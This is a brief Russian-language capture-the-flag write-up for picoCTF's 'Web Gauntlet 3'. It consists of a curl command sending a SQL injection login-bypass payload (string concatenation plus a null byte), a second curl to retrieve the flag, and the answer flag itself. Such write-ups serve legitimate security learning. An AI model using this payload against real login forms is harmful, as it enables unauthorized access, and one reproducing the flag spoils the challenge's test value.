# Задание Web Gauntlet 3

Задание выполняется аналогично заданию Web Gauntlet 2. Очищаем куки picoctf, открываем консоль и пишем
```bash
curl --data "user=ad'||'min'%00&pass=a" http://mercury.picoctf.net:63504/index.php --cookie "PHPSESSID=mo5totl5fpn53tjqn4dftq48uv" --output -
```
и
```bash
curl http://mercury.picoctf.net:63504/filter.php --cookie "PHPSESSID=mo5totl5fpn53tjqn4dftq48uv" | grep picoCTF
```
и получаем флаг (рис 1)

![img](media/Задание_Web_Gauntlet_3/media/image1.png)

## **ОТВЕТ: picoCTF\{k3ep_1t_sh0rt_eb90a623e2c581bcd3127d9d60a4dead\}**

